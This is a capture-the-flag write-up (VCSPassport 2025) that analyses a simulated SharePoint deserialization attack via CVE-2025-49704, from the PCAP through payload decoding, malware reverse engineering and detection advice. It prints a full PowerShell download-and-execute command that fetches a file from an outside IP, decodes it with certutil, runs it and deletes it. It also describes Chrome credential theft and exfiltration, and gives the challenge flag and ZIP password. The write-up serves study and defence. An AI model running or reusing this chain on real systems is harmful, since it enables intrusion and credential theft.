# Gimme Your Point - VCSPassport 2025

## 📋 Executive Summary

A sophisticated attack simulation exploiting **CVE-2025-49704**, a SharePoint deserialization vulnerability in the ToolShell component. This challenge recreates a real-world case study where attackers embed deserialization payloads (XML/serialized .NET object) into the `MSOTlPn_DWP` parameter of POST requests to achieve remote code execution and exfiltrate Chrome browser credentials.

**Category:** Web/Forensics  
**Event:** VCSPassport 2025  
**Flag:** `VCSPassport{SH4R3_y0R_P$$wD}`

---

## 🎯 MITRE ATT&CK Mapping

| Technique ID | Name | Description |
|--------------|------|-------------|
| `T1190` | Exploit Public-Facing Application | SharePoint CVE-2025-49704 exploitation |
| `T1059.001` | PowerShell | Payload download and execution |
| `T1555.003` | Credentials from Web Browsers | Chrome Login Data & Local State theft |
| `T1560.001` | Archive Collected Data | Password-protected ZIP exfiltration |
| `T1041` | Exfiltration Over C2 Channel | HTTP POST upload to attacker server |

---

## 🔍 Technical Analysis

### Phase 1: Initial PCAP Analysis

Opening the challenge PCAP file in Wireshark, I observed HTTP GET requests returning a `start.aspx` file. This indicated a web-based attack, so I used **Wireshark's Export Objects** feature to extract all HTTP files for analysis.

![HTTP object export](../../img/vcspassport2025/image1.png)

Using `strings` and `file` commands to get an overview of the extracted files, I discovered something suspicious in `ToolPane.aspx` - an encoded **CompressedDataTable** value.

### Phase 2: CVE Research - ToolShell Vulnerability

Searching for "CompressedDataTable SharePoint" led me to VCS's security article about **ToolShell** - a critical SharePoint vulnerability chain being actively exploited in the wild.

> **Key Discovery:** This challenge simulates CVE-2025-49704, where attackers embed deserialization payloads into the `MSOTlPn_DWP` parameter of POST requests.

### Phase 3: Payload Decoding

I extracted the `CompressedDataTable` value and performed:
1. **Base64 decode**
2. **GZIP decompress**

This revealed a suspicious shell payload. Within the `MethodParameters`, I found another Base64-encoded string containing a **PowerShell command**:

```powershell
powershell -c "Invoke-WebRequest -Uri http://30.243.67.128:1234/raw_package -OutFile C:\Windows\Temp\raw_package; 
Add-Content -Path C:\Windows\Temp\raw_package -Value bGVYQjFibU4wU1dOTVlqRkZSVVVBDQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t -Encoding UTF8; 
Add-Content -Path C:\Windows\Temp\raw_package -Value DQo= -Encoding UTF8; 
Add-Content -Path C:\Windows\Temp\raw_package -Value '-----END CERTIFICATE-----' -Encoding UTF8; 
certutil -decode C:\Windows\Temp\raw_package C:\Windows\Temp\d1; 
certutil -decode C:\Windows\Temp\d1 C:\Windows\Temp\health_check.exe; 
del C:\Windows\Temp\raw_package; 
del C:\Windows\Temp\d1; 
C:\Windows\Temp\health_check.exe; 
sleep 10; 
del C:\Windows\Temp\health_check.exe"
```

![PowerShell payload analysis](../../img/vcspassport2025/image13.png)

**Attack Chain:**
1. Download `raw_package` from attacker server
2. Append Base64 certificate data
3. Use `certutil` to decode → `d1` → `health_check.exe`
4. Execute malware and cleanup evidence

### Phase 4: Malware Analysis

Following the PowerShell steps, I obtained `health_check.exe`. Running this executable revealed:

1. Creates a folder in `C:\Windows\Temp`
2. Generates two files:
   - `chrome_health_result` - SQLite database (Chrome Login Data - stores saved usernames/passwords)
   - `chrome_service_result` - Chrome Local State (contains encryption key for decrypting Login Data)
3. Compresses everything into a **password-protected ZIP file**

![Malware execution analysis](../../img/vcspassport2025/image17.png)

### Phase 5: Exfiltration Discovery

Returning to the PCAP, I found a **POST request to `/upload`** endpoint. The file signature starting with `50 4b 03 04` confirmed this was the exfiltrated ZIP file.

I extracted this ZIP from the PCAP but discovered it required a password for extraction.

---

## 💡 The Breakthrough

Since `health_check.exe` creates password-protected ZIPs, the password must be embedded in the binary. I loaded the executable into **IDA Pro** and searched for "pass":

![IDA password search](../../img/vcspassport2025/image17.png)

**Discovery:** Three functions named `GenPass1`, `GenPass2`, `GenPass3` - clearly responsible for generating the ZIP password.

Following these functions in IDA View-A, I located the password components and reconstructed:

```
Password: sup3r_S3(ReT_p4$$wod
```

### Extracting the Flag

Using this password to extract the ZIP, I examined `chrome_health_result` and found:

```
https://flag.win.here/SH4R3_y0R_P$$wD
```

---

## 🚩 Flag & Solution

```
VCSPassport{SH4R3_y0R_P$$wD}
```

---

## 🛡️ Detection Strategy (Blue Team)

### Network-Level Detection
- Monitor for SharePoint requests with unusual `CompressedDataTable` parameters
- Alert on multipart POST uploads to unexpected endpoints
- Detect `certutil -decode` execution chains in network traffic

### Endpoint Detection (EDR/SIEM)
- PowerShell downloading files from external IPs with subsequent `certutil` usage
- Chrome database file access (`Login Data`, `Local State`) by non-browser processes
- ZIP file creation in `C:\Windows\Temp` with immediate upload behavior

### Behavioral Indicators
- Process spawning sequence: PowerShell → certutil → unknown.exe → cleanup
- Access to Chrome credential storage locations
- Self-deleting executables post-execution

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| Wireshark | PCAP analysis, HTTP object export |
| CyberChef | Base64/GZIP decoding |
| IDA Pro | Reverse engineering health_check.exe |
| strings/file | Initial file analysis |
| 7-Zip | Password-protected archive extraction |

---

## 📚 References

- VCS Security Article: ToolShell - Critical SharePoint Vulnerability Chain
- CVE-2025-49704: SharePoint Deserialization RCE
- MITRE ATT&CK: T1190, T1059.001, T1555.003

